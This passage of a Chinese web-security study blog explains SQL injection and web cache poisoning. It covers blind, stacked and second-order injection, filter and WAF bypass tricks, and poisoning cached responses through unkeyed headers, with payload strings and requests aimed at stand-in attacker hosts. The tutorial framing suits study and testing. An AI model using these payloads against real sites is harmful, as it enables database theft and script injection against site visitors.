class="hljs-operator">/</span>判断第一个库第二个字符，更简洁的写法<br></code></pre></td></tr></table></figure><p>这样下来就能一个一个猜出数据库，随后就是和联合注入说的一样的思路去猜表数，猜表名，猜字段名，猜字段</p><p>查当前库就简单一点</p></li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; and if((length(database()))=<span class="hljs-number">7</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>) --+  查库长度<br><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; and if((select count(*) from information_schema.tables where table_schema=database())=<span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)--+ 查表数量<br></code></pre></td></tr></table></figure><p>​其实抽象起来就这几个</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">id=<span class="hljs-number">1</span> and <span class="hljs-built_in">if</span>(       <span class="hljs-selector-tag">select</span> <span class="hljs-built_in">count</span>(*) 查个数         ,<span class="hljs-built_in">sleep</span>(<span class="hljs-number">2</span>),<span class="hljs-number">1</span>)<br>id=<span class="hljs-number">1</span> and <span class="hljs-built_in">if</span>(       <span class="hljs-selector-tag">select</span> <span class="hljs-built_in">length</span>() limit 查长度     ,<span class="hljs-built_in">sleep</span>(<span class="hljs-number">5</span>),<span class="hljs-number">1</span> )<br>id=<span class="hljs-number">1</span> and <span class="hljs-built_in">if</span>(       <span class="hljs-built_in">substr</span>(  (<span class="hljs-selector-tag">select</span> limit语句)  <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)  查字符     ， <span class="hljs-built_in">sleep</span>(<span class="hljs-number">5</span>),<span class="hljs-number">1</span> )<br></code></pre></td></tr></table></figure><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>​当注入点使用的执行函数允许一次性执行多个 SQL 语句的时候，例如 PHP 中的 <code>multi_muti_query</code>或者PDO，堆叠注入即存在。堆叠注入相较于其他方式，利用的手法更加自由，不局限于原来的 SELECT 语句，而可以拓展到 INSERT、SHOW、SET、UPDATE 语句等。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show tables--+</span><br><span class="hljs-string">id=1&#x27;</span>;<span class="hljs-keyword">select</span> sleep(<span class="hljs-number">5</span>)_<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>​部分网站在代码层面上对sql注入的防御通常是写一个无敌的过滤器出来，自定义为安全函数。然后所有用户传入的参数都经过这个安全函数处理。</p><p>​于是攻击者把payload先存入数据库，然后在另一处调出这个payload，以此触发payload。</p><p>​设计者忽视没有经过用户传参的sql语句，就达成了二次注入</p><p>​比如注册一个用户名为**admin’ #**的用户，注册时并无SQL注入，修改密码时的SQL语句为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">update user set password=&#x27;$password&#x27; where username=&#x27;admin&#x27; #&#x27;<br></code></pre></td></tr></table></figure><p>​导致越权修改了admin的密码。由于二次注入利用链比较长，更容易被开发忽视，但往往黑盒很难测试出来，需要代码审计。</p><h3 id="6-绕过过滤"><a href="#6-绕过过滤" class="headerlink" title="6. 绕过过滤"></a>6. 绕过过滤</h3><h4 id="1-通用绕过关键字方"><a href="#1-通用绕过关键字方" class="headerlink" title="1. 通用绕过关键字方"></a>1. 通用绕过关键字方</h4><p>（1）<code>/**/</code> <code>&lt;&gt;</code>分割</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">sel<span class="hljs-operator">&lt;&gt;</span>ect<br>sel<span class="hljs-comment">/**/</span>ect<br></code></pre></td></tr></table></figure><p>（2）大小混写和双写</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">selselectect</span>     <br>sElcT    比如MYSQL大小写不敏感，但WAF的过滤函数大小写敏感<br></code></pre></td></tr></table></figure><p>（3）编码</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">url编码绕过<br>16进制编码绕过<br>ASCII编码绕过<br></code></pre></td></tr></table></figure><h4 id="2-绕过符号过滤"><a href="#2-绕过符号过滤" class="headerlink" title="2. 绕过符号过滤"></a>2. 绕过符号过滤</h4><p>（1）逗号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>)b <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">3</span>)  <span class="hljs-comment">-- join代替</span><br><span class="hljs-comment">-- 盲注中</span><br>substr(str <span class="hljs-keyword">from</span> pos <span class="hljs-keyword">for</span> len) <span class="hljs-comment">--在str中从第pos位截取len长的字符</span><br>mid(str <span class="hljs-keyword">from</span> pos <span class="hljs-keyword">for</span> len) <span class="hljs-comment">--在str中从第pos位截取len长的字符</span><br>limit <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">1</span><br><span class="hljs-built_in">substring</span>(str <span class="hljs-keyword">from</span> pos) <span class="hljs-comment">--返回字符串str的第pos个字符，索引从1开始</span><br></code></pre></td></tr></table></figure><p>（2）空格</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">（<span class="hljs-number">1</span>）双空格 <br>（<span class="hljs-number">2</span>）<span class="hljs-comment">/**/</span> <br>（<span class="hljs-number">3</span>）用括号绕过 <br>（<span class="hljs-number">4</span>）<span class="hljs-operator">%</span><span class="hljs-number">20</span> <span class="hljs-operator">%</span><span class="hljs-number">09</span> <span class="hljs-operator">%</span><span class="hljs-number">0</span>a <span class="hljs-operator">%</span><span class="hljs-number">0</span>b <span class="hljs-operator">%</span><span class="hljs-number">0</span>c <span class="hljs-operator">%</span><span class="hljs-number">0</span>d <span class="hljs-operator">%</span>a0 <span class="hljs-operator">%</span><span class="hljs-number">00</span> 等不可见字符<br></code></pre></td></tr></table></figure><p>（3）等号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">如果等号被过滤了我们可以用 <span class="hljs-keyword">like</span> 代替 （<span class="hljs-keyword">and</span> <span class="hljs-number">1</span>like1）<br>使用<span class="hljs-keyword">like</span> 、rlike 、regexp 或者 使用<span class="hljs-operator">&lt;</span> 或者 <span class="hljs-operator">&gt;</span><br><span class="hljs-comment">-- 大小于号都没了就用between、greatest()、least()</span><br></code></pre></td></tr></table></figure><p>（4）or and xor not</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span><span class="hljs-operator">=</span><span class="hljs-operator">&amp;&amp;</span>  <span class="hljs-keyword">or</span><span class="hljs-operator">=</span><span class="hljs-operator">||</span>   xor<span class="hljs-operator">=</span><span class="hljs-operator">|</span>   <span class="hljs-keyword">not</span><span class="hljs-operator">=</span><span class="hljs-operator">!</span> <span class="hljs-comment">-- 用管道符</span><br></code></pre></td></tr></table></figure><h4 id="3-寻找等价函数"><a href="#3-寻找等价函数" class="headerlink" title="3.寻找等价函数"></a>3.寻找等价函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql">hex()、bin() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> ascii() <br>sleep() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> benchmark() <br>concat_ws()<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span>group_concat() <br>mid()、substr() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-built_in">substring</span>() <br>@<span class="hljs-variable">@user</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">user</span>() <br>@<span class="hljs-variable">@datadir</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> datadir() <br>举例：<span class="hljs-built_in">substring</span>()和substr()无法使用时：?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">+</span><span class="hljs-keyword">and</span><span class="hljs-operator">+</span>ascii(<span class="hljs-built_in">lower</span>(mid((<span class="hljs-keyword">select</span><span class="hljs-operator">+</span>pwd<span class="hljs-operator">+</span><span class="hljs-keyword">from</span><span class="hljs-operator">+</span>users<span class="hljs-operator">+</span>limit<span class="hljs-operator">+</span><span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))<span class="hljs-operator">=</span><span class="hljs-number">74</span>　 <br>或者： substr((<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;password&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-number">0x70</span> <br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x69</span>) <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x70</span>) <span class="hljs-operator">=</span> <span class="hljs-number">0</span> <br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x71</span>) <span class="hljs-operator">=</span> <span class="hljs-number">-1</span><br><span class="hljs-keyword">into</span> <span class="hljs-variable">@a</span>,<span class="hljs-variable">@b</span>  <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span><br></code></pre></td></tr></table></figure><p>​infromation_schema被过滤的话：</p><ul><li><h4 id="MySQL-5-6-的新特性"><a href="#MySQL-5-6-的新特性" class="headerlink" title="MySQL 5.6 的新特性"></a>MySQL 5.6 的新特性</h4><p>在 MySQL 5.5.x 之后的版本，MySQL 开始将 innoDB 引擎作为 MySQL 的默认引擎，因此从 MySQL 5.6.x 版本开始，MySQL 在数据库中添加了两张表，<code>innodb_index_stats</code> 和 <code>innodb_table_stats</code>，两张表都会存储数据库和对应的数据表。</p><p>因此，从 MySQL 5.6.x 开始，有了取代 <code>information_schema</code> 的表名查询方式，如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> mysql.innodb_index_stats <span class="hljs-keyword">where</span> database_name<span class="hljs-operator">=</span>database();<br><span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> mysql.innodb_table_stats <span class="hljs-keyword">where</span> database_name<span class="hljs-operator">=</span>database();<br></code></pre></td></tr></table></figure></li><li><h4 id="MySQL-5-7-的新特性"><a href="#MySQL-5-7-的新特性" class="headerlink" title="MySQL 5.7 的新特性"></a>MySQL 5.7 的新特性</h4><p>由于 <code>performance_schema</code> 过于发杂，所以 MySQL 在 5.7 版本中新增了 <code>Sys schema</code> 视图，基础数据来自于 <code>performance_chema</code> 和 <code>information_schema</code> 两个库。</p><p>而其中有这样一个视图，<code>schema_table_statistics_with_buffer,x$schema_table_statistics_with_buffer</code>，我们可以翻阅官方文档对其的解释</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> sys.schema_table_statistics_with_buffer <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database();<br><span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> sys.x$schema_table_statistics_with_buffer <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database();<br></code></pre></td></tr></table></figure></li><li><h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><p>在因为 <code>information_schema</code> 被过滤或其他原因无法获得字段名的时候，可以通过别名的方式绕过获取<strong>字段名</strong>的这一步骤</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> a,b <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">as</span> a, <span class="hljs-number">2</span> <span class="hljs-keyword">as</span> b <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users)x;<br></code></pre></td></tr></table></figure></li></ul><h4 id="4-非常规"><a href="#4-非常规" class="headerlink" title="4. 非常规"></a>4. 非常规</h4><p>​比如脏数据溢出绕过，pipline绕过，分块传输绕过，白名单绕过，宽字节，多参数， 。</p><p>​宽字节注入：</p><p>​有些时候系统使用如下代码进行转义（例如在 PHP 中）：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">$username <span class="hljs-operator">=</span> addslashes($_GET[<span class="hljs-string">&#x27;username&#x27;</span>]); <span class="hljs-operator">/</span><span class="hljs-operator">/</span> 会将 <span class="hljs-string">&#x27; 变成 \&#x27;</span><br></code></pre></td></tr></table></figure><p>​但是攻击者输入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">%</span>bf<span class="hljs-operator">%</span><span class="hljs-number">27</span> <span class="hljs-keyword">OR</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>​在GBK环境下：</p><ul><li><code>%bf%27</code> 会被解码为一个合法汉字（因为 <code>%bf</code> 是多字节编码中的前导字节）。</li><li><code>addslashes</code> 不会将 <code>%bf</code> 和 <code>%27</code> 识别为单个字符，而只是对 <code>&#39;</code> 做了转义。</li><li>数据库解析时 <code>%bf%27</code> 被解释为：汉字 + <code>&#39;</code>，从而使 <code>&#39;</code> 落单，形成注入点。</li></ul><p>​这些骚操作这里引用一篇文章</p><p>​<a href="https://www.anquanke.com/post/id/268428">sql注入绕WAF的N种姿势</a></p><p>​<a href="https://blog.csdn.net/l1028386804/article/details/85869703">渗透之——SQL注入绕过技术总结</a></p><p>​<a href="https://www.freebuf.com/articles/web/261524.html">珂技系列之一篇就够了——mysql注入</a></p><h2 id="自动化：sqlmap"><a href="#自动化：sqlmap" class="headerlink" title="自动化：sqlmap"></a>自动化：sqlmap</h2><p>​<a href="https://blog.csdn.net/shanguicsdn111/article/details/142088764">SQLmap使用教程</a></p><p>​<a href="https://sqlmap.org/">官方网站</a></p><p><img src="/2025/10/23/SQLI/80d2a4ffaa0cb7d7d1db82770ccdf1cf.png"></p><p>这里着重提一下，用sqlmap绕过WAF</p><p>SQLmap内置了很多绕过脚本，在 &#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;tamper&#x2F; 目录下：</p><p><img src="/2025/10/23/SQLI/image-20251024195214666.png"></p><p>脚本按照用途命名，比如 space2comment.py 是指，用&#x2F;**&#x2F;代替空格。</p><p>当然，你也可以根据内置脚本格式，自己定义绕过脚本。</p>]]></content>
    
    
    <categories>
      
      <category>web安全专题</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>web缓存投毒</title>
    <link href="/2025/10/19/web-cache2/"/>
    <url>/2025/10/19/web-cache2/</url>
    
    <content type="html"><![CDATA[<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-strong">**欺骗**</span>主要是利用源服务器和Cache端之间的解析差异，让受害者写入包含敏感信息的缓存，动态信息误入缓存，攻击者读取Cache窃取信息。<br><span class="hljs-code">通常是在后缀，目录名，文件名上找解析漏洞做文章；且一般都需要发送恶意链接让受害者写入缓存</span><br><span class="hljs-code">**投毒**主要是攻击者利用cache rules/key上漏洞， 把受污染的静态文件写入缓存，受害者在正常上网时，就读取了污染文件，收到xss类似的攻击。</span><br><span class="hljs-code">通常逻辑是利用Cache rules不包含（及不会写入key）的注入点（各种header的忽略，参数上的解析差异等 就是所谓的非密钥输入），直接在缓存中写入DOM或者导入含毒的静态文件</span><br></code></pre></td></tr></table></figure><h1 id="Web缓存中毒（Web-Cache-Deception）"><a href="#Web缓存中毒（Web-Cache-Deception）" class="headerlink" title="Web缓存中毒（Web Cache Deception）"></a><strong>Web缓存中毒</strong>（Web Cache Deception）</h1><p><img src="/2025/10/19/web-cache2/image-20251019160244128.png"></p><p><a href="https://i4g5d.github.io/2025/10/15/web-cache/">Web缓存欺骗</a> 是通过构造并发送恶意URL链接，让受害者写入本不会写入缓存的敏感信息，然后攻击者读取包含敏感信息的缓存；</p><p>Web缓存中毒则是利用服务器和缓存的行为向受害者提供有害的http响应</p><pre><code class="hljs">1. 成功的缓存中毒攻击可以结合其他攻击（利用XSS、JavaScript注入、开放重定向等漏洞）2.  受害页面的流量越大，缓存中毒影响越大</code></pre><h2 id="利用缓存设计缺陷："><a href="#利用缓存设计缺陷：" class="headerlink" title="利用缓存设计缺陷："></a>利用缓存设计缺陷：</h2><p> 我总结下来就是利用非密钥输入，（例如 HTTP 标头和 Cookie）来利用 Web 缓存投毒漏洞</p><ol><li><p>发起XSS攻击 </p><p>利用一些标头的非加密性，例如<code>X-Forwarded-Host</code>（<code>X-Forwarded-Host</code>被用来动态生成 Open Graph 图片 URL，然后将其反映在响应中。对于 Web 缓存中毒而言，至关重要的是<code>X-Forwarded-Host</code>标头通常是无密钥的。）</p><p>正常模式：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">GET</span> /en?<span class="hljs-attribute">region</span>=uk HTTP/1.1 <br>Host: innocent-website.com <br>X-Forwarded-Host: innocent-website.co.uk <br><br>HTTP/1.1 200 OK <br>Cache-Control: public &lt;meta <span class="hljs-attribute">property</span>=<span class="hljs-string">&quot;og:image&quot;</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;https://innocent-website.co.uk/cms/social.png&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><p>那就可以构造</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">X-Forwarded-Host: a.&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&quot;<br><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;og:image&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;https://a.&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&quot;/cms/social.png&quot; /&gt;<br></code></pre></td></tr></table></figure></li><li><p>利用资源导入的不安全处理</p><p> 将URL指向自己的恶意js文件</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>innocent-website.com<br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>evil-user.net<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 Firefox/57.0<br><br><span class="language-apache"><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> <span class="hljs-number">200</span> OK</span><br><span class="language-apache"><span class="hljs-section">&lt;script src=<span class="hljs-string">&quot;https://evil-user.net/static/analytics.js&quot;</span>&gt;</span><span class="hljs-section">&lt;/script&gt;</span></span><br></code></pre></td></tr></table></figure><p>1和2通常一起考虑 在XFH进行恶意注入 如果直接注入xss等无效 就用资源导入 导入攻击者的JS文件写入cache</p></li><li><p>Web 缓存中毒利用 Cookie 处理漏洞</p></li></ol><p>   这种很少见，简单带过。就是往往缓存键不包括cookie ,如果cookie的信息会得到相应的响应，或cookie本就有构造的价值，就能写入缓存攻击</p><ol start="4"><li><p>使用多个标头</p><p>网站肯定不会向上面说的那么简单就收到缓存中毒，那就要结合所谓的<strong>多头联合投毒</strong></p><p>比如服务器的 redirect 逻辑是这样（伪代码）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> req.<span class="hljs-property">header</span>[<span class="hljs-string">&#x27;X-Forwarded-Proto&#x27;</span>] == <span class="hljs-string">&#x27;http&#x27;</span>:<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">301</span> <span class="hljs-title class_">Location</span>: <span class="hljs-string">&quot;https://&quot;</span> + req.<span class="hljs-property">header</span>[<span class="hljs-string">&#x27;Host&#x27;</span>] + req.<span class="hljs-property">path</span><br></code></pre></td></tr></table></figure><p>攻击者控制两个未纳入 cache key 的输入：</p><ul><li><code>X-Forwarded-Proto: http</code></li><li><code>X-Forwarded-Host: attacker.example.com</code></li></ul><p>服务器返回</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">301</span> Moved Permanently<br><span class="hljs-attribute">Location</span><span class="hljs-punctuation">: </span>https://attacker.example.com/random<br></code></pre></td></tr></table></figure><p>缓存把这个 301 缓存（且 cache key 只基于 Host+path，不包含 X-Forwarded-*），</p><p>那么后续普通访问 <code>GET /random</code>（不带这些 headers）会被边缘节点以缓存返回 <strong>301 Location: <a href="https://attacker.example.com/random">https://attacker.example.com/random</a></strong> → 所有用户都被重定向到攻击者站点。</p><p>（在做实验时，找攻击的文件时，要注意找个原本就是解析js语句的文件，因为实验要求是执行<code>alert</code>）</p></li><li><p>利用相应暴露的信息</p><p>一个是类似<code>max-age=1800</code>包含有关清除缓存的频率或当前缓存的响应有多久的信息；一个是Vary标头，这个标头定义哪些请求头算进cache key 例如：Vary: User-Agent。</p></li><li><p>利用基于 DOM 的漏洞</p><p>这和第2点像，2是导入攻击者的静态文件，而这里是利用DOM进行导入；</p><p>如果一个站点会从某个 URL 加载数据（例如 JSON），并在客户端不经安全清理地把这些数据放进 DOM&#x2F;执行，那么攻击者可以通过<strong>污染该 URL 的缓存内容</strong>（使其返回恶意 JSON&#x2F;脚本）来让所有普通用户加载并在浏览器中触发 DOM 型漏洞。</p><p>比如网站直接读取json，我们将读取的文件改成自己构造的json,随后进行写Cache，但是记得同源策略，自己服务器上加入Access-Control-Allow-Origin: *</p></li><li><p>链接式 Web 缓存投毒漏洞</p><p>正如我们之前所见，有时攻击者只能通过使用多个标头精心构造请求来引发恶意响应。但不同类型的攻击也存在同样的情况。Web 缓存投毒有时需要攻击者将我们讨论过的几种技术串联起来。通过串联不同的漏洞，通常可以暴露最初无法利用的额外漏洞层。后面有实验能反应这种情况</p></li></ol><h2 id="利用缓存实现方式的缺陷！："><a href="#利用缓存实现方式的缺陷！：" class="headerlink" title="利用缓存实现方式的缺陷！："></a>利用缓存实现方式的缺陷！：</h2><p>用非密钥方式的方式只是皮毛，这里利用缓存系统特定实现中的缺陷，扩大 Web 缓存投毒的攻击面。</p><h3 id="缓存键缺陷"><a href="#缓存键缺陷" class="headerlink" title="缓存键缺陷"></a>缓存键缺陷</h3><p>​我们在写入缓存时，通常不会考虑加上payload,因为我们会认为这是受害者基本很难触发读Cache的。</p><p>​但实际CDN&#x2F;缓存&#x2F;代理&#x2F;应用经常对这些“keyed”组件做变换（去掉 query、过滤特定参数、规范化顺序或大小写等），从而产生键与应用处理输入之间的不一致。</p><h3 id="缓存探测方法（探索缺陷3步骤）"><a href="#缓存探测方法（探索缺陷3步骤）" class="headerlink" title="缓存探测方法（探索缺陷3步骤）"></a>缓存探测方法（探索缺陷3步骤）</h3><ol><li><p>识别合适的 cache oracle（必须）</p><p><strong>目的</strong>：找到一个“能告诉你缓存是否命中”的端点（称作 oracle），它应满足：</p><ul><li><strong>可被缓存</strong>（<code>Cache-Control</code>&#x2F;状态头显示可缓存或你观测到 <code>Age/X-Cache</code>），</li><li><strong>响应会反映你发的输入</strong>（能把你放在 URL&#x2F;header&#x2F;query 的 token 反映回响应 body 或 header），</li><li><strong>能通过响应头或时间差判断 hit&#x2F;miss</strong>。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 先 probe（确认“干净”）</span><br><br>curl -I <span class="hljs-string">&quot;https://target.example.com/path?cb=PROBE123&quot;</span><br><br><span class="hljs-comment"># 观察响应头：X-Cache / Age / Cache-Control / CF-Cache-Status</span><br></code></pre></td></tr></table></figure><p>如果有指纹信息，查文档找，例如：</p><p>如果站点使用特定 CDN（Akamai 等），查文档看是否能直接请求显示 cache key（例如 <code>Pragma: akamai-x-get-cache-key</code>）。</p></li><li><p>探测 key handling</p><p><strong>目标</strong>：找出缓存在生成 cache key 时做了哪些<strong>额外处理</strong>（比如去掉 query、过滤特定参数、规范化端口&#x2F;大小写、排序参数、解码行为等）。</p><details>  <summary><b>📘 点击展开解释</b></summary><p>常见检测向量（每个向量都用 probe→test→compare）</p><ol><li>是否完全忽略 query string？</li></ol><p>对比 GET &#x2F;p?cb&#x3D;1&amp;a&#x3D;1 与 GET &#x2F;p?cb&#x3D;2&amp;a&#x3D;2 的 cache 行为（probe 后，注入 token 再读）。</p><ol start="2"><li>是否过滤特定参数（utm_*、_ga、fbclid）？</li></ol><p>把 token 放在 ?utm_source&#x3D;TOKEN 等，写入后读 &#x2F;p 看是否命中。</p><ol start="3"><li>Host&#x2F;Port 是否被规范化（端口是否被剔除）？</li></ol><p>先请求 Host: 1337，观察 Location 包含 :1337（回显）。然后请求 Host: host 看是否返回缓存带 :1337 的 Location（如教材例子）。</p><ol start="4"><li>参数排序&#x2F;大小写&#x2F;编码是否规范化？</li></ol><p>比较 ?a&#x3D;1&amp;b&#x3D;2 与 ?b&#x3D;2&amp;a&#x3D;1，以及 %2F vs &#x2F; 的变体。</p><ol start="5"><li>是否对部分 header 做 key-normalize 或 strip？</li></ol><p>注入 header（X-Forwarded-Host、Origin）并观察是否会被反射与缓存。</p></details></li><li><p>识别 exploitable gadget（选择“有用”的漏洞点）</p><p><strong>为什么要找 gadget？</strong> 缓存键缺陷只是让你能写入“被共享的缓存条目”，但真正能造成危害的，是缓存里的内容会怎样被客户端或服务端“消费”——即 gadget。</p><p>高价值 gadget：</p><ul><li><strong>反射 XSS 点</strong>（把输入原样注入到 HTML&#x2F;JS 中）→ 缓存中毒后变成 stored XSS。</li><li><strong>可控 Location &#x2F; redirect</strong> → 缓存中毒后可把普通 URL 变成全局 redirect。</li><li><strong>动态资源（JSON&#x2F;JS）</strong>：应用把 JSON 字段插入 innerHTML 或 <code>eval</code>，或把 JS 文件当作静态资源缓存（极易造成执行）。</li><li><strong>HTML snippet&#x2F;fragment 请求</strong>（page fragment 被缓存并注入到页面）</li></ul><p><strong>识别方法</strong>：</p><ul><li>在页面找 